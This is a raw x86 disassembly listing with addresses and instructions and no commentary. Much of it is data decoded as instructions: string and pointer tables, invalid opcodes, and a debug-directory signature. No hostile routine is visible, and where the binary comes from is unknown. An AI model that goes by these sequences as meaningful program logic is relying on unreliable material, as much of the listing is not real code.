  42ae3e:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42ae44:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42ae4e:	cmp    edi,edi
  42ae50:	pushf  
  42ae51:	mov    edi,edi
  42ae53:	or     BYTE PTR [esi+ecx*1],cl
  42ae56:	jne    0x42ae1b
  42ae58:	call   0xbae24
  42ae5d:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42ae61:	mov    ebx,DWORD PTR [eax]
  42ae63:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42ae67:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42ae6f:	pop    esi
  42ae70:	dec    ecx
  42ae72:	and    al,0x10
  42ae74:	call   DWORD PTR [ebp+0x24]
  42ae77:	in     al,dx
  42ae78:	call   0xffc6ad61
  42ae7d:	adc    BYTE PTR [eax+edi*1+0xc],al
  42ae81:	pushf  
  42ae82:	pop    esi
  42ae83:	mov    ebp,esp
  42ae85:	and    al,0xc2
  42ae87:	push   edi
  42ae88:	add    BYTE PTR [ecx+0x3a],al
  42ae8b:	mov    DWORD PTR [ebp+0x24],esi
  42ae8e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42ae94:	dec    DWORD PTR [eax]
  42ae96:	and    al,0x7
  42ae98:	(bad)  
  42ae99:	cli    
  42ae9a:	and    al,0x98
  42ae9c:	or     BYTE PTR [edx],dh
  42ae9e:	sbb    BYTE PTR [ebx],al
  42aea0:	adc    al,0x89
  42aea2:	jmp    DWORD PTR [esp]
  42aea5:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42aeab:	adc    al,0x8
  42aead:	dec    ebp
  42aeae:	adc    BYTE PTR [ebp-0x7c],dh
  42aeb1:	mov    esi,DWORD PTR [edx]
  42aeb3:	and    al,0x24
  42aeb5:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42aebb:	add    edi,eax
  42aebd:	pcmpeqb mm1,mm2
  42aec0:	jmp    0x42af0e
  42aec2:	dec    DWORD PTR [eax]
  42aec4:	je     0x42aeb1
  42aec6:	mov    edi,DWORD PTR [ecx]
  42aec8:	pop    ebp
  42aec9:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42aecd:	cwde   
  42aece:	mov    DWORD PTR [eax-0x8],ebp
  42aed1:	jge    0x42af3b
  42aed3:	dec    DWORD PTR [ecx+0x5fbf7424]
  42aed9:	jl     0x42af25
  42aedb:	adc    BYTE PTR [eax],al
  42aedd:	pop    esp
  42aede:	cmp    al,0x10
  42aee0:	add    BYTE PTR [ecx+0x41],dl
  42aee3:	adc    BYTE PTR [eax],al
  42aee5:	test   al,0x21
  42aee7:	adc    BYTE PTR [eax],al
  42aee9:	cs jbe 0x42aefc
  42aeec:	add    BYTE PTR [edx+0xe],ch
  42aeef:	adc    BYTE PTR [eax],al
  42aef1:	clc    
  42aef2:	pusha  
  42aef3:	adc    BYTE PTR [eax],al
  42aef5:	jp     0x42af38
  42aef7:	adc    BYTE PTR [eax],al
  42aef9:	mov    ds:0x88001059,eax
  42aefe:	pop    ebp
  42aeff:	adc    BYTE PTR [eax],al
  42af01:	inc    ax
  42af03:	adc    BYTE PTR [eax],al
  42af05:	fldcw  WORD PTR [esi-0x5122ffbe]
  42af0b:	inc    edx
  42af0c:	add    cl,ah
  42af0e:	scas   al,BYTE PTR es:[edi]
  42af0f:	inc    edx
  42af10:	add    ch,ah
  42af12:	scas   al,BYTE PTR es:[edi]
  42af13:	inc    edx
  42af14:	add    cl,ch
  42af16:	scas   al,BYTE PTR es:[edi]
  42af17:	inc    edx
  42af18:	add    ch,ch
  42af1a:	scas   al,BYTE PTR es:[edi]
  42af1b:	inc    edx
  42af1c:	add    cl,dh
  42af1e:	scas   al,BYTE PTR es:[edi]
  42af1f:	inc    edx
  42af20:	add    ch,dh
  42af22:	scas   al,BYTE PTR es:[edi]
  42af23:	inc    edx
  42af24:	add    cl,bh
  42af26:	scas   al,BYTE PTR es:[edi]
  42af27:	inc    edx
  42af28:	add    ch,bh
  42af2a:	scas   al,BYTE PTR es:[edi]
  42af2b:	inc    edx
  42af2c:	add    BYTE PTR [ecx],al
  42af2e:	scas   eax,DWORD PTR es:[edi]
  42af2f:	inc    edx
  42af30:	add    cl,dl
  42af32:	cmp    BYTE PTR [eax],dl
  42af34:	add    BYTE PTR [edi],dl
  42af36:	xor    BYTE PTR [eax],dl
  42af38:	add    BYTE PTR [eax],al
  42af3a:	pop    ds
  42af3b:	adc    BYTE PTR [eax],al
  42af3d:	(bad)  
  42af3e:	adc    BYTE PTR ds:[eax],al
  42af41:	in     eax,0x19
  42af43:	adc    BYTE PTR [eax],al
  42af45:	bound  ebx,QWORD PTR [ecx]
  42af47:	adc    BYTE PTR [eax],al
  42af49:	shl    BYTE PTR [edi+0x10],1
  42af4c:	add    BYTE PTR [edi+0x31001057],al
  42af52:	scas   eax,DWORD PTR es:[edi]
  42af53:	inc    edx
  42af54:	add    BYTE PTR ds:0x390042af,dh
  42af5a:	scas   eax,DWORD PTR es:[edi]
  42af5b:	inc    edx
  42af5c:	add    BYTE PTR ds:0x410042af,bh
  42af62:	scas   eax,DWORD PTR es:[edi]
  42af63:	inc    edx
  42af64:	add    BYTE PTR [ebp-0x51],al
  42af67:	inc    edx
  42af68:	add    BYTE PTR [ecx-0x51],cl
  42af6b:	inc    edx
  42af6c:	add    BYTE PTR [ebp-0x51],cl
  42af6f:	inc    edx
  42af70:	add    dl,ah
  42af72:	adc    BYTE PTR ds:[eax],al
  42af75:	ds pop ebp
  42af77:	adc    BYTE PTR [eax],al
  42af79:	add    BYTE PTR [esi+0x10],ah
  42af7c:	add    al,ch
  42af7e:	pop    eax
  42af7f:	adc    BYTE PTR [eax],al
  42af81:	cdq    
  42af82:	outs   dx,BYTE PTR ds:[esi]
  42af83:	adc    BYTE PTR [eax],al
  42af85:	ja     0x42afe7
  42af87:	adc    BYTE PTR [eax],al
  42af89:	jne    0x42afc2
  42af8b:	adc    BYTE PTR [eax],al
  42af8d:	arpl   WORD PTR [eax+edx*1],bx
  42af90:	add    BYTE PTR [ecx-0x51],dh
  42af93:	inc    edx
  42af94:	add    BYTE PTR [ebp-0x51],dh
  42af97:	inc    edx
  42af98:	add    BYTE PTR [ecx-0x51],bh
  42af9b:	inc    edx
  42af9c:	add    BYTE PTR [ebp-0x51],bh
  42af9f:	inc    edx
  42afa0:	add    BYTE PTR [ecx-0x7affbd51],al
  42afa6:	scas   eax,DWORD PTR es:[edi]
  42afa7:	inc    edx
  42afa8:	add    BYTE PTR [ecx-0x72ffbd51],cl
  42afae:	scas   eax,DWORD PTR es:[edi]
  42afaf:	inc    edx
  42afb0:	add    BYTE PTR [ecx+edx*1+0x10],bl
  42afb4:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42afbb:	adc    BYTE PTR [eax],al
  42afbd:	and    al,0x30
  42afbf:	adc    BYTE PTR [eax],al
  42afc1:	ret    
  42afc2:	pop    edi
  42afc3:	adc    BYTE PTR [eax],al
  42afc5:	loopne 0x42b02d
  42afc7:	adc    BYTE PTR [eax],al
  42afc9:	add    eax,0xd400105b
  42afce:	aas    
  42afcf:	adc    BYTE PTR [eax],al
  42afd1:	mov    cl,0xaf
  42afd3:	inc    edx
  42afd4:	add    BYTE PTR [ebp-0x46ffbd51],dh
  42afda:	scas   eax,DWORD PTR es:[edi]
  42afdb:	inc    edx
  42afdc:	add    BYTE PTR [ebp-0x3effbd51],bh
  42afe2:	scas   eax,DWORD PTR es:[edi]
  42afe3:	inc    edx
  42afe4:	add    ch,al
  42afe6:	scas   eax,DWORD PTR es:[edi]
  42afe7:	inc    edx
  42afe8:	add    cl,cl
  42afea:	scas   eax,DWORD PTR es:[edi]
  42afeb:	inc    edx
  42afec:	add    ch,cl
  42afee:	scas   eax,DWORD PTR es:[edi]
  42afef:	inc    edx
  42aff0:	add    dh,dl
  42aff2:	sbb    eax,0x10f00010
  42aff7:	adc    BYTE PTR [eax],al
  42aff9:	inc    ecx
  42affa:	bound  edx,QWORD PTR [eax]
  42affc:	add    BYTE PTR [ebx+eax*1],ah
  42afff:	adc    BYTE PTR [eax],al
  42b001:	jecxz  0x42b066
  42b003:	adc    BYTE PTR [eax],al
  42b005:	pushf  
  42b006:	xor    DWORD PTR [eax],edx
  42b008:	add    BYTE PTR [ecx],al
  42b00a:	or     dl,BYTE PTR [eax]
  42b00c:	add    dh,dl
  42b00e:	inc    edi
  42b00f:	adc    BYTE PTR [eax],al
  42b011:	icebp  
  42b012:	scas   eax,DWORD PTR es:[edi]
  42b013:	inc    edx
  42b014:	add    ch,dh
  42b016:	scas   eax,DWORD PTR es:[edi]
  42b017:	inc    edx
  42b018:	add    cl,bh
  42b01a:	scas   eax,DWORD PTR es:[edi]
  42b01b:	inc    edx
  42b01c:	add    ch,bh
  42b01e:	scas   eax,DWORD PTR es:[edi]
  42b01f:	inc    edx
  42b020:	add    BYTE PTR [ecx],al
  42b022:	mov    al,0x42
  42b024:	add    BYTE PTR ds:0x90042b0,al
  42b02a:	mov    al,0x42
  42b02c:	add    BYTE PTR ds:0x430042b0,cl
  42b032:	xor    dh,BYTE PTR [edx]
  42b034:	xor    eax,0x5a52345f
  42b039:	push   esp
  42b03a:	xor    BYTE PTR [esi],dh
  42b03c:	add    BYTE PTR [ecx+0x36],cl
  42b03f:	push   eax
  42b040:	pop    edi
  42b041:	ss inc ebx
  42b043:	ss pop edx
  42b045:	xor    ebx,DWORD PTR [edi+0x52]
  42b048:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42b04c:	pop    edi
  42b04d:	dec    esi
  42b04e:	dec    esp
  42b04f:	dec    eax
  42b050:	xor    esi,DWORD PTR [edx]
  42b052:	pop    edi
  42b053:	xor    al,0x4b
  42b055:	add    BYTE PTR [eax+0x49],cl
  42b058:	push   ebp
  42b059:	xor    al,0x5f
  42b05b:	dec    esp
  42b05c:	inc    edx
  42b05d:	dec    ecx
  42b05e:	cmp    DWORD PTR [edi+ebx*2],esi
  42b061:	pop    ecx
  42b062:	inc    edi
  42b063:	add    BYTE PTR [eax+0x50],bl
  42b066:	dec    eax
  42b067:	pop    edi
  42b068:	push   ebp
  42b069:	push   ecx
  42b06a:	inc    edi
  42b06b:	xor    cl,BYTE PTR [edx+0x38]
  42b06e:	push   esi
  42b06f:	add    BYTE PTR [ebx+0x4a],al
  42b072:	push   edx
  42b073:	pop    edi
  42b074:	dec    edi
  42b075:	dec    eax
  42b076:	dec    edi
  42b077:	dec    edi
  42b078:	dec    edx
  42b079:	add    BYTE PTR [ecx+0x52],al
  42b07c:	cmp    DWORD PTR [edi+0x56],ebx
  42b07f:	aaa    
  42b080:	dec    esp
  42b081:	cmp    DWORD PTR [ebx+0x5f],eax
  42b084:	push   edx
  42b085:	inc    esp
  42b086:	add    BYTE PTR [ecx+0x37],bl
  42b089:	inc    esp
  42b08a:	pop    edi
  42b08b:	dec    ecx
  42b08c:	xor    esi,DWORD PTR [edi]
  42b08e:	xor    DWORD PTR [edi+0x49],ebx
  42b091:	push   esp
  42b092:	xor    eax,DWORD PTR [eax]
  42b094:	push   edx
  42b095:	xor    BYTE PTR [eax+0x5f],bl
  42b098:	dec    eax
  42b099:	push   edi
  42b09a:	inc    esi
  42b09b:	xor    DWORD PTR [edi+0x5f],edx
  42b09e:	cmp    BYTE PTR [ebx+0x37],dl
  42b0a1:	add    BYTE PTR [esi+0x42],dl
  42b0a4:	dec    ecx
  42b0a5:	xor    ebx,DWORD PTR [edi+0x45]
  42b0a8:	xor    BYTE PTR [ebp+0x5f],cl
  42b0ab:	xor    al,0x34
  42b0ad:	xor    BYTE PTR [edx+0x5f],cl
  42b0b0:	inc    edi
  42b0b1:	add    BYTE PTR [edx+0x57],dl
  42b0b4:	xor    ebx,DWORD PTR [edi+0x31]
  42b0b7:	dec    edx
  42b0b8:	push   edi
  42b0b9:	xor    eax,0x4d435f
  42b0be:	dec    ecx
  42b0bf:	xor    eax,0x36365f39
  42b0c4:	dec    eax
  42b0c5:	xor    BYTE PTR [eax],al
  42b0c7:	dec    edi
  42b0c8:	inc    ebx
  42b0c9:	push   edi
  42b0ca:	pop    edi
  42b0cb:	inc    edi
  42b0cc:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42b0d1:	add    BYTE PTR [edx+0x58],al
  42b0d4:	inc    edi
  42b0d5:	ss pop edi
  42b0d7:	push   esi
  42b0d8:	inc    ebx
  42b0d9:	dec    esi
  42b0da:	inc    esp
  42b0db:	add    BYTE PTR [edi+0x4d],cl
  42b0de:	inc    edi
  42b0df:	xor    ebx,DWORD PTR [edi+0x34]
  42b0e2:	dec    esi
  42b0e3:	pop    edx
  42b0e4:	cmp    BYTE PTR [edi+0x58],bl
  42b0e7:	cmp    BYTE PTR [eax],al
  42b0e9:	push   edx
  42b0ea:	pop    eax
  42b0eb:	push   ecx
  42b0ec:	pop    edi
  42b0ed:	dec    esp
  42b0ee:	push   edx
  42b0ef:	dec    ecx
  42b0f0:	dec    edi
  42b0f1:	inc    esp
  42b0f2:	pop    edi
  42b0f3:	dec    edi
  42b0f4:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42b0f8:	push   eax
  42b0f9:	inc    ebp
  42b0fa:	pop    edi
  42b0fb:	xor    eax,0x565f3945
  42b100:	add    BYTE PTR [edi+0x4e],al
  42b103:	push   esi
  42b104:	pop    edi
  42b105:	inc    edi
  42b106:	push   esp
  42b107:	dec    eax
  42b108:	xor    dh,BYTE PTR [ecx]
  42b10a:	pop    edi
  42b10b:	dec    edi
  42b10c:	xor    eax,DWORD PTR ss:[eax]
  42b10f:	inc    esp
  42b110:	inc    ebp
  42b111:	dec    ecx
  42b112:	pop    edi
  42b113:	push   edx
  42b114:	dec    eax
  42b115:	xor    al,0x48
  42b117:	dec    ecx
  42b118:	ss pop edi
  42b11a:	aaa    
  42b11b:	aaa    
  42b11c:	dec    ecx
  42b11d:	dec    ebp
  42b11e:	add    BYTE PTR [eax+0x54],cl
  42b121:	ss pop edi
  42b123:	inc    esi
  42b124:	inc    edx
  42b125:	xor    dh,BYTE PTR [eax+eax*1]
  42b128:	dec    esi
  42b129:	ss dec edx
  42b12b:	pop    edi
  42b12c:	dec    ecx
  42b12d:	dec    esp
  42b12e:	inc    edi
  42b12f:	inc    esp
  42b130:	dec    eax
  42b131:	xor    BYTE PTR [eax],bh
  42b133:	xor    eax,0x4c344f00
  42b138:	xor    esi,DWORD PTR [edi]
  42b13a:	xor    BYTE PTR [edi+0x44],bl
  42b13d:	inc    edi
  42b13e:	dec    ebx
  42b13f:	xor    al,BYTE PTR [ecx+0x43]
  42b142:	add    BYTE PTR [edi+0x32],cl
  42b145:	xor    ebx,DWORD PTR [edi+0x57]
  42b148:	xor    cl,BYTE PTR [edi+0x5f]
  42b14b:	pop    edx
  42b14c:	add    BYTE PTR [eax+0x4c],bl
  42b14f:	cmp    DWORD PTR [edi+0x4b],ebx
  42b152:	inc    ecx
  42b153:	dec    edx
  42b154:	inc    esi
  42b155:	xor    DWORD PTR [edi+ebx*2],esi
  42b158:	pop    eax
  42b159:	inc    edi
  42b15a:	inc    edx
  42b15b:	add    BYTE PTR [eax+0x33],dl
  42b15e:	dec    esi
  42b15f:	pop    edi
  42b160:	dec    eax
  42b161:	xor    eax,0x485f53
  42b166:	dec    ebp
  42b167:	xor    BYTE PTR [edx+0x5f],al
  42b16a:	dec    edx
  42b16b:	pop    eax
  42b16c:	push   esp
  42b16d:	dec    ecx
  42b16e:	dec    esp
  42b16f:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42b173:	xor    esi,DWORD PTR [eax]
  42b175:	pop    edi
  42b176:	inc    ecx
  42b177:	pop    edx
  42b178:	push   ecx
  42b179:	pop    edx
  42b17a:	cmp    DWORD PTR [esi],esi
  42b17c:	pop    edi
  42b17d:	dec    eax
  42b17e:	dec    esp
  42b17f:	pop    edx
  42b180:	add    BYTE PTR [ecx+0x57],dl
  42b183:	pop    ecx
  42b184:	pop    edi
  42b185:	push   esi
  42b186:	xor    al,0x44
  42b188:	xor    DWORD PTR [eax],edi
  42b18a:	xor    bl,BYTE PTR [edi+0x39]
  42b18d:	push   esp
  42b18e:	push   esp
  42b18f:	add    BYTE PTR [esi+0x0],dl
  42b192:	dec    edi
  42b193:	add    BYTE PTR [edi+0x0],al
  42b196:	add    BYTE PTR ss:[edi+0x0],bl
  42b19a:	dec    edi
  42b19b:	add    BYTE PTR [edx+0x0],bl
  42b19e:	inc    ebp
  42b19f:	add    BYTE PTR [eax],dh
  42b1a1:	add    BYTE PTR [ebp+0x0],al
  42b1a4:	xor    BYTE PTR [eax],al
  42b1a6:	pop    edi
  42b1a7:	add    BYTE PTR [eax],dh
  42b1a9:	add    BYTE PTR ds:0x4f000000,dh
  42b1af:	add    BYTE PTR ds:0x5f005700,dh
  42b1b5:	add    BYTE PTR [edi],dh
  42b1b7:	add    BYTE PTR [ebx+0x0],dl
  42b1ba:	push   ebp
  42b1bb:	add    BYTE PTR [edi+0x0],al
  42b1be:	xor    al,0x0
  42b1c0:	pop    edi
  42b1c1:	add    BYTE PTR [ecx+0x0],dl
  42b1c4:	inc    esp
  42b1c5:	add    BYTE PTR [eax],al
  42b1c7:	add    BYTE PTR [edx+0x0],dl
  42b1ca:	push   esp
  42b1cb:	add    BYTE PTR ds:0x52005f00,dh
  42b1d1:	add    BYTE PTR [edi+0x0],dl
  42b1d4:	xor    al,BYTE PTR [eax]
  42b1d6:	xor    al,BYTE PTR [eax]
  42b1d8:	xor    BYTE PTR [eax],al
  42b1da:	xor    BYTE PTR [eax],al
  42b1dc:	pop    edi
  42b1dd:	add    BYTE PTR [esi],dh
  42b1df:	add    BYTE PTR [eax],al
  42b1e1:	add    BYTE PTR [eax+0x0],cl
  42b1e4:	inc    ebp
  42b1e5:	add    BYTE PTR [eax+eax*1+0x30],cl
  42b1e9:	add    BYTE PTR [edi+0x0],bl
  42b1ec:	dec    edx
  42b1ed:	add    BYTE PTR [edx],dh
  42b1ef:	add    BYTE PTR [edi],dh
  42b1f1:	add    BYTE PTR [ebp+0x0],dl
  42b1f4:	add    BYTE PTR ss:[eax],dh
  42b1f7:	add    BYTE PTR [eax],al
  42b1f9:	add    BYTE PTR [esi+0x0],dl
  42b1fc:	cmp    BYTE PTR [eax],al
  42b1fe:	dec    edi
  42b1ff:	add    BYTE PTR [ecx],bh
  42b201:	add    BYTE PTR [edi+0x0],bl
  42b204:	pop    eax
  42b205:	add    BYTE PTR [edx+0x0],bl
  42b208:	dec    esp
  42b209:	add    BYTE PTR [ebx+0x0],cl
  42b20c:	add    BYTE PTR [eax],al
  42b20e:	dec    ecx
  42b20f:	add    BYTE PTR [ebp+0x0],dl
  42b212:	dec    edi
  42b213:	add    BYTE PTR [eax],bh
  42b215:	add    BYTE PTR [edi+0x0],bl
  42b218:	inc    esp
  42b219:	add    BYTE PTR [eax],bh
  42b21b:	add    BYTE PTR [ecx+0x0],cl
  42b21e:	dec    eax
  42b21f:	add    BYTE PTR [edi+0x0],cl
  42b222:	pop    edi
  42b223:	add    BYTE PTR [ebp+0x0],al
  42b226:	pop    eax
  42b227:	add    BYTE PTR [eax],al
  42b229:	add    BYTE PTR [edx+0x0],dl
  42b22c:	dec    esp
  42b22d:	add    BYTE PTR [esi],dh
  42b22f:	add    BYTE PTR [edi+0x0],bl
  42b232:	aaa    
  42b233:	add    BYTE PTR [eax+0x0],bl
  42b236:	xor    eax,DWORD PTR [eax]
  42b238:	inc    edi
  42b239:	add    BYTE PTR [ecx+0x0],dl
  42b23c:	pop    edi
  42b23d:	add    BYTE PTR [edx+0x0],cl
  42b240:	add    BYTE PTR [eax],al
  42b242:	inc    edi
  42b243:	add    BYTE PTR [edi+0x0],cl
  42b246:	push   ebx
  42b247:	add    BYTE PTR [eax+eax*1],dh
  42b24a:	pop    edi
  42b24b:	add    BYTE PTR [ecx+0x0],cl
  42b24e:	xor    DWORD PTR [eax],eax
  42b250:	push   esi
  42b251:	add    BYTE PTR [ebx],dh
  42b253:	add    BYTE PTR [edi+0x0],bl
  42b256:	dec    ecx
  42b257:	add    BYTE PTR [edx+0x0],bl
  42b25a:	add    BYTE PTR [eax],al
  42b25c:	inc    ebx
  42b25d:	add    BYTE PTR [ecx+0x0],bl
  42b260:	inc    ecx
  42b261:	add    BYTE PTR [eax],dh
  42b263:	add    BYTE PTR [ecx],bh
  42b265:	add    BYTE PTR [edi+0x0],bl
  42b268:	cmp    DWORD PTR [eax],eax
  42b26a:	push   eax
  42b26b:	add    BYTE PTR [eax+eax*1],dh
  42b26e:	pop    edx
  42b26f:	add    BYTE PTR [eax],al
  42b271:	add    BYTE PTR [edx+0x0],al
  42b274:	inc    esi
  42b275:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42b279:	add    BYTE PTR [ebp+0x0],dl
  42b27c:	push   ebp
  42b27d:	add    BYTE PTR [eax+eax*1+0x57],dl
  42b281:	add    BYTE PTR [eax],al
  42b283:	add    BYTE PTR [eax+eax*1+0x37],dl
  42b287:	add    BYTE PTR [eax+eax*1+0x38],dl
  42b28b:	add    BYTE PTR [edi+0x0],bl
  42b28e:	xor    eax,DWORD PTR [eax]
  42b290:	cmp    DWORD PTR [eax],eax
  42b292:	dec    eax
  42b293:	add    BYTE PTR [edi+0x0],bl
  42b296:	dec    ebp
  42b297:	add    BYTE PTR [ecx+0x0],bl
  42b29a:	cmp    DWORD PTR [eax],eax
  42b29c:	inc    ecx
  42b29d:	add    BYTE PTR [esi+0x0],cl
  42b2a0:	add    BYTE PTR [eax],al
  42b2a2:	inc    ebx
  42b2a3:	add    BYTE PTR [eax+0x0],dl
  42b2a6:	dec    esi
  42b2a7:	add    BYTE PTR [eax+eax*1],dh
  42b2aa:	pop    edi
  42b2ab:	add    BYTE PTR [eax+eax*1+0x54],cl
  42b2af:	add    BYTE PTR [ebx+0x0],cl
  42b2b2:	xor    DWORD PTR [eax],eax
  42b2b4:	add    BYTE PTR [eax],al
  42b2b6:	inc    ecx
  42b2b7:	add    BYTE PTR [edi],dh
  42b2b9:	add    BYTE PTR [edx+0x0],cl
  42b2bc:	pop    edi
  42b2bd:	add    BYTE PTR [ebx+0x0],al
  42b2c0:	cmp    BYTE PTR [eax],al
  42b2c2:	push   edi
  42b2c3:	add    BYTE PTR [eax+0x0],dl
  42b2c6:	pop    edi
  42b2c7:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42b2cb:	add    BYTE PTR [edx],dh
  42b2cd:	add    BYTE PTR [eax],al
  42b2cf:	add    BYTE PTR [edx+0x0],al
  42b2d2:	add    BYTE PTR [eax],al
  42b2d4:	push   edx
  42b2d5:	push   ebx
  42b2d6:	inc    esp
  42b2d7:	push   ebx
  42b2d8:	sub    bl,cl
  42b2da:	test   BYTE PTR [edx-0x70],al
  42b2dd:	or     al,BYTE PTR [edi]
  42b2df:	dec    esi
  42b2e0:	sub    DWORD PTR [eax+0x63],0xffffffdf
  42b2e4:	sbb    eax,DWORD PTR [ecx+0x1c18d1]
  42b2ea:	add    BYTE PTR [eax],al
  42b2ec:	push   ecx
  42b2ed:	cmp    bl,BYTE PTR [edi+ebp*2+0x51]
  42b2f1:	js     0x42b348
  42b2f3:	jbe    0x42b367
  42b2f5:	arpl   WORD PTR [esi+0x75],dx
  42b2f8:	popa   
  42b2f9:	push   esi
  42b2fa:	pop    esp
  42b2fb:	outs   dx,DWORD PTR ds:[esi]
  42b2fc:	ins    DWORD PTR es:[edi],dx
  42b2fd:	dec    eax
  42b2fe:	inc    edi
  42b2ff:	push   0x6c445178
  42b304:	jbe    0x42b377
  42b306:	pop    esp
  42b307:	push   0x70
  42b309:	js     0x42b36c
  42b30b:	ins    BYTE PTR es:[edi],dx
  42b30c:	ins    BYTE PTR es:[edi],dx
  42b30d:	dec    eax
  42b30e:	addr16 pop esp
  42b310:	push   0x4a
  42b312:	jb     0x42b376
  42b314:	push   esp
  42b315:	ins    DWORD PTR es:[edi],dx
  42b316:	push   edx
  42b317:	bound  eax,QWORD PTR [edi+0x6d]
  42b31a:	push   eax
  42b31b:	arpl   WORD PTR [esi+0x77],ax
  42b31e:	pop    esp
  42b31f:	jo     0x42b38b
  42b321:	dec    ecx
  42b322:	inc    ebp
  42b323:	push   bp
  42b325:	ins    BYTE PTR es:[edi],dx
  42b326:	inc    ebp
  42b327:	dec    ebp
  42b328:	jne    0x42b3a1
  42b32a:	jbe    0x42b375
  42b32c:	cs jo  0x42b393
  42b32f:	bound  eax,QWORD PTR [eax]
	...
